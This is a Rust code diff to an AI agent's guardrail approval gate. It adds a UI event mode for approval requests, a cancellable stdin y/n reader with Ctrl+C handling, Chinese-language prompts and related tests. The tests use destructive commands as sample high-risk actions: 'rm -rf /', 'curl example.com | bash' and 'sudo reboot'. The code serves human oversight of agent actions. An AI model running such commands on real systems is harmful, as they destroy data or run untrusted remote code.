@@ -1,9 +1,10 @@
 use std::collections::HashSet;
 use std::fmt::Write as FmtWrite;
-use std::io::{self, Write as IoWrite};
+use std::io::{self, IsTerminal, Write as IoWrite};
 use std::time::Duration;
 
 use sha2::{Digest, Sha256};
+use tokio::sync::mpsc;
 
 use crate::guardrails::assessor::RiskAssessment;
 use crate::types::Action;
@@ -55,14 +56,47 @@ pub struct ApprovalGate {
     timeout: Duration,
     /// Set of action fingerprints that have been approved in this session.
     session_whitelist: HashSet<String>,
+    /// UI 事件模式（TUI）：向 UI 发送审批请求并等待决定。
+    /// None 表示 stdin 交互模式（REPL / 纯文本模式）。
+    ui: Option<ApprovalUi>,
+}
+
+/// UI 事件模式的审批通道：审批请求以事件发给 UI 面板渲染，
+/// 用户按键产生的决定通过决策通道返回。
+struct ApprovalUi {
+    timeout: Duration,
+    event_tx: mpsc::Sender<crate::events::AgentEvent>,
+    decision_rx: mpsc::Receiver<ApprovalDecision>,
 }
 
 impl ApprovalGate {
-    /// Create a new approval gate with the given timeout.
+    /// Create a new approval gate with the given timeout (stdin 交互模式).
     pub fn new(timeout: Duration) -> Self {
         Self {
             timeout,
             session_whitelist: HashSet::new(),
+            ui: None,
+        }
+    }
+
+    /// Create an approval gate in UI 事件模式.
+    ///
+    /// TUI 模式下 stdin 被 crossterm raw mode 接管，无法直接读取 y/n 输入，
+    /// 因此审批请求以 `GuardrailApprovalNeeded` 事件发给 UI，并通过
+    /// `decision_rx` 等待 UI 返回决定。
+    pub fn with_ui_events(
+        timeout: Duration,
+        event_tx: mpsc::Sender<crate::events::AgentEvent>,
+        decision_rx: mpsc::Receiver<ApprovalDecision>,
+    ) -> Self {
+        Self {
+            timeout,
+            session_whitelist: HashSet::new(),
+            ui: Some(ApprovalUi {
+                timeout,
+                event_tx,
+                decision_rx,
+            }),
         }
     }
 
@@ -84,8 +118,9 @@ impl ApprovalGate {
     /// The flow is:
     /// 1. Generate a deterministic fingerprint of the action.
     /// 2. If the fingerprint is whitelisted, return `Approved` immediately.
-    /// 3. Print risk information to stderr and prompt the user (y/n).
-    /// 4. Wait for input with the configured timeout.
+    /// 3. Ask the user: stdin 交互模式打印风险信息并读取 y/n；
+    ///    UI 事件模式发送 `GuardrailApprovalNeeded` 事件并等待决定。
+    /// 4. Wait for the response with the configured timeout.
     /// 5. If approved, add the fingerprint to the whitelist.
     ///
     /// This is an async function because it waits for user input with a
@@ -95,6 +130,25 @@ impl ApprovalGate {
         action: &Action,
         assessment: &RiskAssessment,
     ) -> ApprovalDecision {
+        // UI 事件模式（TUI）：不触碰 stdin，把审批请求发给 UI 并等待决定
+        if let Some(ui) = self.ui.as_mut() {
+            let fingerprint = fingerprint_action(action);
+            // 会话白名单：已批准过的操作无需再次询问
+            if self.session_whitelist.contains(&fingerprint) {
+                return ApprovalDecision::Approved {
+                    by: "session_whitelist".to_string(),
+                    reason: Some("本会话中此前已批准".to_string()),
+                };
+            }
+            let decision = await_ui_decision(ui, action, assessment).await;
+            if matches!(&decision, ApprovalDecision::Approved { .. }) {
+                self.whitelist(&fingerprint);
+            }
+            return decision;
+        }
+
+        // stdin 交互模式（纯文本/--no-tui；REPL 已改用 UI 事件模式，
+        // 由 REPL 自身打印审批块并读取 y/n，见 main.rs handle_approval_event）
         let input = read_yes_no_with_timeout(self.timeout);
         self.request_approval_inner(action, assessment, input).await
     }
@@ -115,7 +169,7 @@ impl ApprovalGate {
         if self.is_whitelisted(&fingerprint) {
             return ApprovalDecision::Approved {
                 by: "session_whitelist".to_string(),
-                reason: Some("Previously approved in this session".to_string()),
+                reason: Some("本会话中此前已批准".to_string()),
             };
         }
 
@@ -123,20 +177,57 @@ impl ApprovalGate {
         print_risk_info(action, assessment);
 
         // Step 4: wait for user input with timeout
-        match input.await {
+        let decision = match input.await {
             UserResponse::Yes => {
                 // Step 5: add to whitelist
                 self.whitelist(&fingerprint);
                 ApprovalDecision::Approved {
                     by: "user".to_string(),
-                    reason: Some("User approved the action".to_string()),
+                    reason: Some("用户批准了该操作".to_string()),
                 }
             }
             UserResponse::No => ApprovalDecision::Denied {
-                reason: "User denied the action".to_string(),
+                reason: "用户拒绝了该操作".to_string(),
             },
             UserResponse::Timeout => ApprovalDecision::Timeout,
-        }
+        };
+
+        // 清除审批提示块，让屏幕回到对话流（批准/拒绝/超时一致处理）
+        clear_risk_info();
+
+        decision
+    }
+}
+
+/// UI 事件模式：发送审批请求事件，等待 UI 返回决定（带超时）。
+async fn await_ui_decision(
+    ui: &mut ApprovalUi,
+    action: &Action,
+    assessment: &RiskAssessment,
+) -> ApprovalDecision {
+    // 清空陈旧决定：上一轮审批中 agent 先超时、UI 后补发的 Timeout
+    // 决定会残留在通道里，不清空会被本轮审批立即消费，导致用户还没
+    // 看到审批提示就"超时"（历史 bug，见 CHANGELOG 根因记录）。
+    // 必须在发送事件**之前**清空：UI 只会收到事件后才发决定。
+    while ui.decision_rx.try_recv().is_ok() {}
+
+    let request = crate::events::ApprovalRequest::new(
+        uuid::Uuid::new_v4().to_string(),
+        action_display(action),
+        risk_level_cn(&assessment.level).to_string(),
+        assessment.reasons.clone(),
+        assessment.suggested_mitigation.clone(),
+    );
+    // try_send：事件通道由 UI 事件循环非阻塞轮询，不等待接收方
+    let _ = ui
+        .event_tx
+        .try_send(crate::events::AgentEvent::GuardrailApprovalNeeded { request });
+
+    match tokio::time::timeout(ui.timeout, ui.decision_rx.recv()).await {
+        Ok(Some(decision @ ApprovalDecision::Approved { .. })) => decision,
+        Ok(Some(decision @ ApprovalDecision::Denied { .. })) => decision,
+        // 超时、通道关闭、或 UI 明确返回 Timeout 一律按超时处理
+        Ok(Some(ApprovalDecision::Timeout)) | Ok(None) | Err(_) => ApprovalDecision::Timeout,
     }
 }
 
@@ -199,7 +290,11 @@ fn bytes_to_hex(bytes: &[u8]) -> String {
 // ============================================================================
 
 /// Outcome of the user-input read with timeout.
-enum UserResponse {
+///
+/// 公开仅供 REPL（bin crate）复用：审批处理用它读取 y/n 并映射为审批决定。
+#[doc(hidden)]
+#[derive(Debug, Clone, Copy, PartialEq, Eq)]
+pub enum UserResponse {
     Yes,
     No,
     Timeout,
@@ -209,58 +304,201 @@ enum UserResponse {
 fn print_risk_info(action: &Action, assessment: &RiskAssessment) {
     let mut stderr = io::stderr().lock();
 
+    // 保存光标位置（DECSC）：审批结束后整块清除，不留在对话流里
+    if stderr.is_terminal() {
+        let _ = write!(stderr, "\x1b7");
+    }
+
     let _ = writeln!(stderr);
-    let _ = writeln!(stderr, "=== Guardrail Approval Required ===");
-    let _ = writeln!(stderr, "Action: {action:?}");
-    let _ = writeln!(stderr, "Risk Level: {:?}", assessment.level);
+    let _ = writeln!(stderr, "=== 需要护栏审批 ===");
+    let _ = writeln!(stderr, "操作: {}", action_display(action));
+    let _ = writeln!(stderr, "风险等级: {}", risk_level_cn(&assessment.level));
 
     if !assessment.reasons.is_empty() {
-        let _ = writeln!(stderr, "Reasons:");
+        let _ = writeln!(stderr, "原因:");
         for reason in &assessment.reasons {
             let _ = writeln!(stderr, "  - {reason}");
         }
     }
 
     if let Some(ref mitigation) = assessment.suggested_mitigation {
-        let _ = writeln!(stderr, "Mitigation: {mitigation}");
+        let _ = writeln!(stderr, "缓解措施: {mitigation}");
     }
 
     let _ = writeln!(stderr, "===================================");
-    let _ = write!(stderr, "Approve this action? (y/n): ");
+    let _ = write!(stderr, "是否批准此操作? (y/n): ");
     let _ = stderr.flush();
+}
+
+/// 清除审批提示块：恢复打印前保存的光标位置（DECRC）并清除到屏幕底。
+///
+/// 依赖终端的光标保存/恢复能力；非终端（stderr 重定向）时不做任何事，
+/// 避免在日志文件中写入转义序列。
+fn clear_risk_info() {
+    let mut stderr = io::stderr().lock();
+    if stderr.is_terminal() {
+        let _ = write!(stderr, "\x1b8\x1b[J");
+        let _ = stderr.flush();
+    }
+}
+
+/// Render an action as a human-readable Chinese description.
+fn action_display(action: &Action) -> String {
+    match action {
+        Action::ToolCall { name, params, .. } => {
+            format!("工具调用: {name}\n参数: {params}")
+        }
+        Action::FinalAnswer { summary } => format!("最终回答: {summary}"),
+        Action::AskUser { question } => format!("询问用户: {question}"),
+        Action::NoOp => "空操作".to_string(),
+    }
+}
+
+/// Chinese name for a risk level.
+fn risk_level_cn(level: &crate::guardrails::assessor::RiskLevel) -> &'static str {
+    use crate::guardrails::assessor::RiskLevel;
+    match level {
+        RiskLevel::Low => "低",
+        RiskLevel::Medium => "中",
+        RiskLevel::High => "高",
+        RiskLevel::Critical => "严重",
+    }
 }
 
 /// Read a yes/no answer from stdin with a timeout.
 ///
-/// Spawns a blocking task to read from stdin, then wraps it with
-/// `tokio::time::timeout`.  Returns `UserResponse::Timeout` if the user does
-/// not respond within the deadline.
-async fn read_yes_no_with_timeout(timeout: Duration) -> UserResponse {
-    let result = tokio::time::timeout(timeout, async {
-        tokio::task::spawn_blocking(move || {
-            let mut input = String::new();
-            match io::stdin().read_line(&mut input) {
-                Ok(_) => {
-                    let trimmed = input.trim().to_lowercase();
-                    if trimmed == "y" || trimmed == "yes" {
-                        Some(true)
-                    } else {
-                        Some(false)
-                    }
-                }
-                Err(_) => None,
+/// 可取消的轮询式读取：用 `poll(2)` 非阻塞检查 stdin 可读性，仅在
+/// 整行到达后才 `read(2)`（cooked 模式下 read 不会阻塞）。超时后
+/// 本函数直接返回，**不残留任何阻塞线程**。
+///
+/// 审批期间按 Ctrl+C 视为「拒绝」：cooked 模式（ISIG）下 Ctrl+C 的
+/// 默认动作是直接终止进程，REPL 会在审批中途整体退出（历史 bug）。
+/// 监听 `ctrl_c` 信号后进程存活，审批按拒绝处理并正常重绘界面。
+///
+/// 历史 bug：旧实现 `spawn_blocking` + 阻塞 `read_line` 在超时后
+/// 无法取消——阻塞线程永久泄漏在 stdin read 上，与 rustyline
+/// 竞争同一个 fd，用户输入被随机吞掉（"输入文字难输入"），
+/// 每次审批超时泄漏一个线程，见 CHANGELOG 根因记录。
+///
+/// 公开仅供 REPL（bin crate）复用：REPL 收到 `GuardrailApprovalNeeded`
+/// 事件后同样用它读取 y/n（REPL 模式下 stdin 审批不再由 ApprovalGate
+/// 内部的 stdin 分支承担）。
+#[doc(hidden)]
+pub async fn read_yes_no_with_timeout(timeout: Duration) -> UserResponse {
+    let deadline = tokio::time::Instant::now() + timeout;
+    let mut buf: Vec<u8> = Vec::new();
+    let mut ctrl_c = Box::pin(tokio::signal::ctrl_c());
+    loop {
+        // 超时、Ctrl+C、下一轮询周期三选一：Ctrl+C 分支返回「拒绝」
+        // 而不是让默认动作终止进程（审批期间终端是 cooked，ISIG 生效）
+        tokio::select! {
+            _ = tokio::time::sleep_until(deadline) => {
+                // 超时后清空 stdin 缓冲：用户可能在提示消失前补输了 y，
+                // 残留字节会被 rustyline 读成下一轮任务（历史 bug 症状）
+                drain_stdin();
+                return UserResponse::Timeout;
             }
-        })
-        .await
-        .unwrap_or(None)
-    })
-    .await;
+            r = &mut ctrl_c => {
+                // Ctrl+C（或信号流异常）→ 拒绝；进程存活，界面正常重绘
+                let _ = r;
+                drain_stdin();
+                return UserResponse::No;
+            }
+            _ = tokio::time::sleep(Duration::from_millis(50)) => {}
+        }
+        match poll_stdin_readable() {
+            StdinState::Readable => {
+                let mut chunk = [0u8; 128];
+                let n = unsafe {
+                    libc::read(0, chunk.as_mut_ptr() as *mut libc::c_void, chunk.len())
+                };
+                if n > 0 {
+                    buf.extend_from_slice(&chunk[..n as usize]);
+                    if line_complete(&buf) {
+                        break;
+                    }
+                } else if n == 0 {
+                    // stdin 关闭（EOF）→ 拒绝
+                    return UserResponse::No;
+                }
+                // n < 0（EAGAIN 等）继续轮询
+            }
+            StdinState::Closed => return UserResponse::No,
+            StdinState::NotReady => {}
+        }
+    }
+    // 审批输入读取完毕后清空 stdin 残留字节（粘贴多行等场景），
+    // 防止残留输入成为下一轮任务
+    drain_stdin();
+    let text = String::from_utf8_lossy(&buf);
+    let trimmed = text.trim().to_lowercase();
+    if trimmed == "y" || trimmed == "yes" {
+        UserResponse::Yes
+    } else {
+        UserResponse::No
+    }
+}
 
-    match result {
-        Ok(Some(true)) => UserResponse::Yes,
-        Ok(Some(false)) => UserResponse::No,
-        Ok(None) => UserResponse::No, // stdin error → deny
-        Err(_elapsed) => UserResponse::Timeout,
+/// 行结束判定：`\n`（cooked 模式 Enter 经 ICRNL 翻译的结果）或
+/// `\r`（意外 raw 模式下 ICRNL 未翻译）均视为行已完整。
+///
+/// 只认 `\n` 时，raw 环境（ICRNL off）下 Enter 永远无法完成行，
+/// 审批读取会一直轮询到超时、用户输入完全无效（历史 bug）。
+fn line_complete(buf: &[u8]) -> bool {
+    buf.contains(&b'\n') || buf.contains(&b'\r')
+}
+
+/// stdin 可读状态（`poll(2)` 0 超时非阻塞检查）。
+enum StdinState {
+    /// 有数据可读（cooked 模式下即整行已到达，read 不会阻塞）。
+    Readable,
+    /// 无数据。
+    NotReady,
+    /// stdin 已关闭（EOF）。
+    Closed,
+}
+
+/// 非阻塞检查 stdin（fd 0）是否可读。
+fn poll_stdin_readable() -> StdinState {
+    let mut pfd = libc::pollfd {
+        fd: 0,
+        events: libc::POLLIN,
+        revents: 0,
+    };
+    let ret = unsafe { libc::poll(&mut pfd, 1, 0) };
+    if ret > 0 {
+        if pfd.revents & (libc::POLLHUP | libc::POLLERR | libc::POLLNVAL) != 0 {
+            StdinState::Closed
+        } else if pfd.revents & libc::POLLIN != 0 {
+            StdinState::Readable
+        } else {
+            StdinState::NotReady
+        }
+    } else {
+        StdinState::NotReady
+    }
+}
+
+/// 丢弃 stdin 中所有待读字节。
+///
+/// 审批读取结束/超时后调用：用户补输的 y 等残留输入不能留给
+/// rustyline（会被读成下一轮任务）。cooked 模式下只丢弃已完成的
+/// 整行；未回车的半行由内核行缓冲保留，属正常输入流程。
+#[doc(hidden)]
+pub fn drain_stdin() {
+    loop {
+        match poll_stdin_readable() {
+            StdinState::Readable => {
+                let mut chunk = [0u8; 128];
+                let n = unsafe {
+                    libc::read(0, chunk.as_mut_ptr() as *mut libc::c_void, chunk.len())
+                };
+                if n <= 0 {
+                    break;
+                }
+            }
+            _ => break,
+        }
     }
 }
 
@@ -348,6 +586,59 @@ mod tests {
     // -----------------------------------------------------------------------
 
     #[tokio::test]
+    async fn test_read_yes_no_eof_returns_no_without_blocking() {
+        // 非交互环境（测试）stdin 为 EOF（/dev/null 或已关闭管道）：
+        // poll 报告关闭/read 返回 0 → 立即返回 No，不阻塞整个 timeout
+        let start = tokio::time::Instant::now();
+        let response = read_yes_no_with_timeout(Duration::from_secs(5)).await;
+        assert_eq!(response, UserResponse::No);
+        assert!(
+            start.elapsed() < Duration::from_secs(5),
+            "EOF 应立即返回，不应阻塞到超时"
+        );
+    }
+
+    #[test]
+    fn test_line_complete_accepts_lf_and_cr() {
+        // cooked 模式：Enter 经 ICRNL 翻译为 \n
+        assert!(line_complete(b"y\n"));
+        // 意外 raw 模式：ICRNL 未翻译，Enter 为 \r，同样应完成行
+        assert!(line_complete(b"y\r"));
+        assert!(line_complete(b"yes\r"));
+        // 行未完成
+        assert!(!line_complete(b"y"));
+        assert!(!line_complete(b""));
+    }
+
+    #[tokio::test]
+    async fn test_read_yes_no_ctrl_c_returns_no_without_killing_process() {
+        // 审批期间按 Ctrl+C（SIGINT）：cooked 模式（ISIG）下默认动作会
+        // 直接终止进程。修复后把 Ctrl+C 解释为「拒绝」，进程存活、
+        // 界面得以重绘（历史 bug：审批中误按 Ctrl+C 整个 REPL 退出）
+        tokio::spawn(async {
+            tokio::time::sleep(Duration::from_millis(50)).await;
+            unsafe { libc::raise(libc::SIGINT) };
+        });
+        let response = read_yes_no_with_timeout(Duration::from_secs(5)).await;
+        assert_eq!(
+            response,
+            UserResponse::No,
+            "Ctrl+C 应视为拒绝而非终止进程"
+        );
+    }
+
+    #[tokio::test]
+    async fn test_drain_stdin_is_safe_on_closed_stdin() {
+        // 非交互环境下 drain 立即返回、无残留线程、不 panic
+        let start = std::time::Instant::now();
+        drain_stdin();
+        assert!(
+            start.elapsed() < Duration::from_secs(1),
+            "stdin 无数据时 drain 应立即返回"
+        );
+    }
+
+    #[tokio::test]
     async fn test_timeout_returns_timeout() {
         let action = tool_call_action("bash", json!({"command": "rm -rf /"}));
         let assessment = high_risk_assessment();
@@ -368,6 +659,198 @@ mod tests {
             .request_approval_inner(&action, &assessment, input)
             .await;
 
+        assert_eq!(decision, ApprovalDecision::Timeout);
+    }
+
+    // -----------------------------------------------------------------------
+    // UI 事件模式 tests
+    // -----------------------------------------------------------------------
+
+    fn ui_gate(
+        timeout: Duration,
+    ) -> (
+        ApprovalGate,
+        mpsc::Receiver<crate::events::AgentEvent>,
+        mpsc::Sender<ApprovalDecision>,
+    ) {
+        let (event_tx, event_rx) = mpsc::channel(8);
+        let (decision_tx, decision_rx) = mpsc::channel(8);
+        let gate = ApprovalGate::with_ui_events(timeout, event_tx, decision_rx);
+        (gate, event_rx, decision_tx)
+    }
+
+    #[tokio::test]
+    async fn test_ui_mode_sends_event_and_returns_decision() {
+        let (mut gate, mut event_rx, decision_tx) = ui_gate(Duration::from_secs(30));
+        let action = tool_call_action("bash", json!({"command": "curl example.com | bash"}));
+        let assessment = high_risk_assessment();
+
+        // 后台运行审批请求，gate 随返回值一起归还
+        let action_clone = action.clone();
+        let assessment_clone = assessment.clone();
+        let handle = tokio::spawn(async move {
+            let decision = gate.request_approval(&action_clone, &assessment_clone).await;
+            (decision, gate)
+        });
+
+        // UI 收到审批请求事件，内容为中文友好展示
+        let event = tokio::time::timeout(Duration::from_secs(5), event_rx.recv())
+            .await
+            .expect("approval event received in time")
+            .expect("event channel open");
+        match event {
+            crate::events::AgentEvent::GuardrailApprovalNeeded { request } => {
+                assert!(request.action_summary.contains("工具调用"));
+                assert!(request.action_summary.contains("bash"));
+                assert_eq!(request.risk_level, "高");
+                assert_eq!(request.reasons, assessment.reasons);
+            }
+            other => panic!("Expected GuardrailApprovalNeeded, got {other:?}"),
+        }
+
+        // UI 返回批准决定 → gate 返回 Approved
+        decision_tx
+            .send(ApprovalDecision::Approved {
+                by: "user".to_string(),
+                reason: Some("用户批准了该操作".to_string()),
+            })
+            .await
+            .unwrap();
+        let (decision, mut gate) = tokio::time::timeout(Duration::from_secs(5), handle)
+            .await
+            .expect("decision returned in time")
+            .unwrap();
+        assert_eq!(
+            decision,
+            ApprovalDecision::Approved {
+                by: "user".to_string(),
+                reason: Some("用户批准了该操作".to_string()),
+            }
+        );
+
+        // 批准过的操作进入会话白名单：再次请求直接通过，不再发事件
+        let decision2 = gate.request_approval(&action, &assessment).await;
+        match decision2 {
+            ApprovalDecision::Approved { by, .. } => assert_eq!(by, "session_whitelist"),
+            other => panic!("Expected whitelist approval, got {other:?}"),
+        }
+        assert!(event_rx.try_recv().is_err(), "白名单命中不应再发事件");
+    }
+
+    #[tokio::test]
+    async fn test_ui_mode_deny() {
+        let (mut gate, mut event_rx, decision_tx) = ui_gate(Duration::from_secs(30));
+        let action = tool_call_action("bash", json!({"command": "rm -rf /tmp/x"}));
+        let assessment = high_risk_assessment();
+
+        let action_clone = action.clone();
+        let assessment_clone = assessment.clone();
+        let handle = tokio::spawn(async move {
+            let decision = gate.request_approval(&action_clone, &assessment_clone).await;
+            (decision, gate)
+        });
+
+        let event = tokio::time::timeout(Duration::from_secs(5), event_rx.recv())
+            .await
+            .expect("approval event received in time");
+        assert!(matches!(
+            event,
+            Some(crate::events::AgentEvent::GuardrailApprovalNeeded { .. })
+        ));
+
+        decision_tx
+            .send(ApprovalDecision::Denied {
+                reason: "用户拒绝了该操作".to_string(),
+            })
+            .await
+            .unwrap();
+
+        let (decision, _gate) = tokio::time::timeout(Duration::from_secs(5), handle)
+            .await
+            .expect("decision returned in time")
+            .unwrap();
+        assert_eq!(
+            decision,
+            ApprovalDecision::Denied {
+                reason: "用户拒绝了该操作".to_string(),
+            }
+        );
+    }
+
+    #[tokio::test]
+    async fn test_ui_mode_drains_stale_decision_before_waiting() {
+        let (mut gate, mut event_rx, decision_tx) = ui_gate(Duration::from_millis(200));
+        let action = tool_call_action("bash", json!({"command": "sudo reboot"}));
+        let assessment = high_risk_assessment();
+
+        // 上一轮审批遗留的陈旧 Timeout 决定：若不清空，本轮审批的
+        // recv() 会立即消费它，用户还没看到提示就"超时"（历史 bug）
+        decision_tx.send(ApprovalDecision::Timeout).await.unwrap();
+
+        let action_clone = action.clone();
+        let assessment_clone = assessment.clone();
+        let handle = tokio::spawn(async move {
+            let decision = gate.request_approval(&action_clone, &assessment_clone).await;
+            (decision, gate)
+        });
+
+        // UI 收到本轮审批请求事件
+        let event = tokio::time::timeout(Duration::from_secs(5), event_rx.recv())
+            .await
+            .expect("approval event received in time");
+        assert!(matches!(
+            event,
+            Some(crate::events::AgentEvent::GuardrailApprovalNeeded { .. })
+        ));
+
+        // 用户批准：修复后应等到真实决定，而不是立即消费陈旧 Timeout
+        decision_tx
+            .send(ApprovalDecision::Approved {
+                by: "user".to_string(),
+                reason: Some("用户批准了该操作".to_string()),
+            })
+            .await
+            .unwrap();
+
+        let (decision, _gate) = tokio::time::timeout(Duration::from_secs(5), handle)
+            .await
+            .expect("decision returned in time")
+            .unwrap();
+        assert_eq!(
+            decision,
+            ApprovalDecision::Approved {
+                by: "user".to_string(),
+                reason: Some("用户批准了该操作".to_string()),
+            }
+        );
+    }
+
+    #[tokio::test]
+    async fn test_ui_mode_timeout() {
+        let (mut gate, mut event_rx, _decision_tx) = ui_gate(Duration::from_millis(50));
+        let action = tool_call_action("bash", json!({"command": "sudo reboot"}));
+        let assessment = high_risk_assessment();
+
+        let action_clone = action.clone();
+        let assessment_clone = assessment.clone();
+        let handle = tokio::spawn(async move {
+            let decision = gate.request_approval(&action_clone, &assessment_clone).await;
+            (decision, gate)
+        });
+
+        let event = tokio::time::timeout(Duration::from_secs(5), event_rx.recv())
+            .await
+            .expect("approval event received in time");
+        assert!(matches!(
+            event,
+            Some(crate::events::AgentEvent::GuardrailApprovalNeeded { .. })
+        ));
+
+        // 不发送决定 → gate 在 50ms 后超时
+        let (decision, _gate) = tokio::time::timeout(Duration::from_secs(5), handle)
+            .await
+            .expect("decision returned in time")
+            .unwrap();
         assert_eq!(decision, ApprovalDecision::Timeout);
     }
 
